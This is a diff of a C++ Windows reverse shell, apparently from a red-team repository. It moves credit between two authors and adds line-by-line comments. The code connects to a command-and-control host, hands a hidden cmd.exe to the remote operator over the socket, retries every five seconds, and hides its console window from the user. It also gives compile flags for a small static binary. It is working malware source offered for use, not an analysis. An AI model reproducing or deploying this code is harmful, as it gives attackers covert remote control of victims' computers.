@@ -1,24 +1,19 @@
-//Author : Paranoid Ninja
-//Email  : paranoidninja@protonmail.com
-//Blog   : https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/
+//Compile with g++/i686-w64-mingw32-g++ <filename>.cpp -o <filname>.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+//Author: BankSecurity
+//Link: https://github.com/BankSecurity/Red_Team/blob/master/Reverse_Shell/C%2B%2B_Rev_Shell.cpp
 
-//Compile with g++/i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
-//The effective size with statically compiled code should be around 13 Kb
+//Change IP host address and port on lines 79 and 80
 
-//Add host IP and port on lines 84 and 85
-
-
-#include <winsock2.h>
-#include <windows.h>
-#include <ws2tcpip.h>
-#pragma comment(lib, "Ws2_32.lib")
-#define DEFAULT_BUFLEN 1024
+#include <winsock2.h>	//windows socket communications over TCP/IP
+#include <windows.h>	//required for calling other processes, initiating other headers and calls
+#include <ws2tcpip.h>	//windows socket communications over TCP/IP
+#pragma comment(lib, "Ws2_32.lib") //inform the compiler to statically compile this library into the executable. Without this, our executable wonít run in any machine unless they have Microsoft Visual C/C++ redistributable installed in their system
+#define DEFAULT_BUFLEN 1024  //buffer length for our socketís recv and send function in a variable and give it a constant size of 1024 bytes.
 
 
 void RunShell(char* C2Server, int C2Port) {
     while(true) {
-        Sleep(5000);    // 1000 = One Second
-
+		Sleep(5000); //wait 5 seconds
         SOCKET mySocket;
         sockaddr_in addr;
         WSADATA version;
@@ -46,14 +41,15 @@ void RunShell(char* C2Server, int C2Port) {
             }
             else {
                 char Process[] = "cmd.exe";
-                STARTUPINFO sinfo;
-                PROCESS_INFORMATION pinfo;
+                STARTUPINFO sinfo; //contains details as to what all things should be taken care of before the process starts
+                PROCESS_INFORMATION pinfo; //contains details about the new process,parent process, its child process, other threads and how it will function
                 memset(&sinfo, 0, sizeof(sinfo));
                 sinfo.cb = sizeof(sinfo);
                 sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
-                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
-                WaitForSingleObject(pinfo.hProcess, INFINITE);
+                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket; //typecasting mySocket to a HANDLE, and passing all the input(hStdInput), output(hStdOuput), error(hStdError) of STARTUPINFO struct
+                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo); //CreateProcess API which creates a cmd.exe process using the above variable and pipes the input, output and error to the HANDLE using &sinfo created above
+                //This sinfo will send all the data over socket to our C2Server and we can view all the errors and output of commands we execute in the cmd process.
+				WaitForSingleObject(pinfo.hProcess, INFINITE); //wait for this child process i.e. cmd.exe to finish and close the process handles
                 CloseHandle(pinfo.hProcess);
                 CloseHandle(pinfo.hThread);
 
@@ -65,17 +61,16 @@ void RunShell(char* C2Server, int C2Port) {
                     continue;
                 }
                 if (strcmp(RecvData, "exit\n") == 0) {
-                    exit(0);
+                    exit(0); //I will again wait for buffer to be received over the network. If I receive a string containing ìexit\nî, it will exit our socket program, else will continue with the while loop.
                 }
             }
         }
     }
 }
-//-----------------------------------------------------------
-//-----------------------------------------------------------
-//-----------------------------------------------------------
+
+
 int main(int argc, char **argv) {
-    FreeConsole();
+    FreeConsole(); //function to disable the console window so that it is not visible to the user
     if (argc == 3) {
         int port  = atoi(argv[2]); //Converting port in Char datatype to Integer format
         RunShell(argv[1], port);
